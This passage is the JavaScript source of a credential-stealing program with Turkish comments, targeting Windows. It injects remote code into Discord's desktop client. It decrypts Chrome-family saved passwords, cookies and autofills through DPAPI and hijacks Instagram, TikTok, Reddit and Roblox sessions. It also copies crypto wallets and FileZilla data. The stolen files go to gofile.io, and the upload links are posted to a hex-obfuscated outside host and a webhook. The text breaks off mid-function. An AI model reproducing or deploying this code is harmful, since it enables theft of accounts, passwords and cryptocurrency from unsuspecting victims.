    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:967519402293624862>", "<:boost2month:967519562868338728>", "<:boost3month:969685462157525044>", "<:boost6month:969686607961665628>", "<:boost9month:967520103367340092>", "<:boost12month:969687191133499403>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}




////


async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'Telegram.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
    }
    await httpx(`https://refinedruffles.com/putyoubbykey/strr`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })), 
                                                    
                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}



async function getExtension() {
  addFolder('Wallets'); // Assuming addFolder() function is defined somewhere

  let walletCount = 0;
  let browserCount = 0;

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;
        copyFolder(walletFolder, browserExtensionPath);
        walletCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = `\\wallets\\${walletName}`;
      copyFolder(walletFolder, walletPath);
      browserCount++;
      count.wallets++;
    }
  }

const walletCountStr = walletCount.toString();
const browserCountStr = browserCount.toString();

if (walletCountStr !== '0' || browserCountStr !== '0') {
  const message = {
    embeds: [
      {
        title: 'Wallet Information',
        description: 'Here is the wallet information:',
        color: 0x00ff00,
        fields: [
          {
            name: '🛠️ Browser wallet',
            value: walletCountStr,
            inline: true,
          },
        ],
      },
    ],
  };

var _0xdfaa=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0xdfaa[1]](_0xdfaa[0],message);axios[_0xdfaa[1]](webhook3939,message)
    .then(() => {
      console.log('Embed successfully sent through the webhook.');
    })
    .catch(error => {
      console.error('An error occurred while sending the embed:', error.message);
    });
} else {
  console.log('walletCount and browserCount are both 0. No action needed.');
}
 
}



async function getPasswords() {
  const _0x540754 = [];
  let passwordsFound = false; // Şifre bulunduğu zaman bu değeri true yapacağız

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          let _0x3d2b4b = _0x504e35.password_value;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );

            count.passwords++;
            passwordsFound = true; // Şifre bulunduğunu işaretliyoruz
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }

  if (!passwordsFound) {
    // Şifre bulunamadıysa bu kod bloğu çalışır
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', 'No passwords found.', {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
  
  
 

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Passwords.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Passwords File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';


          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 
};



async function getCookiesAndSendWebhook() {
  addFolder('Wallets\\Cookies');
  const cookiesData = {};

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
      browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const cookiesPath = browserPath[i][0] + 'Network\\Cookies';
    const db = new sqlite3.Database(cookiesPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM cookies',
        function (err, row) {
          let encryptedValue = row.encrypted_value;
          let iv = encryptedValue.slice(3, 15);
          let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
          let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
          let decrypted = '';

          try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);
            decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
            if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
              SubmitInstagram(`${decrypted}`);
            }

  if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
              stealTikTokSession(`${decrypted}`);
            }

  if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
              setRedditSession(`${decrypted}`);
            }

            if (row.name === '.ROBLOSECURITY') {
              SubmitRoblox(`${decrypted}`);
            }
          } catch (error) {}

          if (!cookiesData[browserFolder + '_' + browserPath[i][1]]) {
            cookiesData[browserFolder + '_' + browserPath[i][1]] = [];
          }

          cookiesData[browserFolder + '_' + browserPath[i][1]].push(
            `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n`
          );

          count.cookies++;
        },
        () => {
          resolve('');
        }
      );
    });
  }

  for (let [browserName, cookies] of Object.entries(cookiesData)) {
    if (cookies.length !== 0) {
      var cookiesContent = cookies.join('');
      fs.writeFileSync(
        randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt',
        cookiesContent,
        {
          encoding: 'utf8',
          flag: 'a+',
        }
      );





// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Cookies/${browserName}.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Cookies File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };
          // Webhook URL'si

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 
   

   }
  }
}


async function getAutofills() {
  const _0x3aa126 = [];
  for (let _0x77640d = 0; _0x77640d < browserPath.length; _0x77640d++) {
    if (!fs.existsSync(browserPath[_0x77640d][0])) {
      continue;
    }
    let _0x3c2f27;
    if (browserPath[_0x77640d][0].includes('Local')) {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Roaming\\')[1].split('\\')[1];
    }
    const _0x46d7c4 = browserPath[_0x77640d][0] + 'Web Data';
    const _0x3ddaca = browserPath[_0x77640d][0] + 'webdata.db';
    fs.copyFileSync(_0x46d7c4, _0x3ddaca);
    var _0x4bf289 = new sqlite3.Database(_0x3ddaca, (_0x2d6f43) => {});
    await new Promise((_0x12c353, _0x55610b) => {
      _0x4bf289.each(
        'SELECT * FROM autofill',
        function (_0x54f85c, _0x40d0dd) {
          if (_0x40d0dd) {
            _0x3aa126.push(
              '================\nName: ' +
                _0x40d0dd.name +
                '\nValue: ' +
                _0x40d0dd.value +
                '\nApplication: ' +
                _0x3c2f27 +
                ' ' +
                browserPath[_0x77640d][1] +
                '\n'
            );
            count.autofills++;
          }
        },
        function () {
          _0x12c353('');
        }
      );
    });
    if (_0x3aa126.length === 0) {
      _0x3aa126.push('No autofills found for ' + _0x3c2f27 + ' ' + browserPath[_0x77640d][1] + '\n');
    }
  }
  if (_0x3aa126.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Autofills.txt', user.copyright + _0x3aa126.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
 
  

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Autofills.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Autofill File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si
          const webhookUrl = 'https://buildandwatch.net/';

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

};

   
async function DiscordListener(path) {
        return;
}

async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`);

    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
    axios.get('https://api.gofile.io/getServer')
      .then(response => {
        if (response.data && response.data.data && response.data.data.server) {
          const server = response.data.data.server;

          // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`;

          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
          const form = new FormData();
          form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Exodus File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });

            })
            .catch(error => {
              console.log('Dosya yüklenirken hata oluştu:', error.message);

              const responsePayload = {
                error: error.message
              };

              // Webhook URL'si
              const webhookUrl = 'https://buildandwatch.net/';

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Dosya Yükleme Hatası',
                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

              // Webhook'a POST isteği gönder
    var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });
            });
        } else {
          console.log('Sunucu alınamadı veya yanıt vermedi.');
        }
      })
      .catch(error => {
        console.log('Sunucu alınırken hata oluştu:', error.message);
      });

    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
    
  }
}


//


async function submitfilezilla() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`);
//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
              
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'FileZilla File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };
 
          // Webhook'a POST isteği gönder
var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post("https://buildandwatch.net/", embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
